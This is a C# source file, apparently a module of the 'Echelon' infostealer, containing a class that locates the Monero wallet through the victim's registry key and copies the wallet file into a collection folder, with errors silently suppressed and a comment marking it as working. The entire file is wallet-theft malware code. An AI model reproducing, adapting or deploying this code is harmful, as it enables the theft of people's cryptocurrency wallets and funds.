


using System.IO;
using Microsoft.Win32;

namespace Echelon
{
    internal class Monero
    {
        public static int count;
        public static string base64xmr = "\\Wallets\\Monero\\";

        public static void XMRcoinStr(string directorypath) // Works

        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
                {
                    try
                    {
                        Directory.CreateDirectory(directorypath + base64xmr);
                        var dir = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
                        Directory.CreateDirectory(directorypath + base64xmr);
                        File.Copy(dir, directorypath + base64xmr + dir.Split('\\')[dir.Split('\\').Length - 1]);
                        count++;
                        Wallets.count++;

                    }
                    catch 
                    {
                    }
                }
            }
            catch 
            {

            }

        }
    }
}
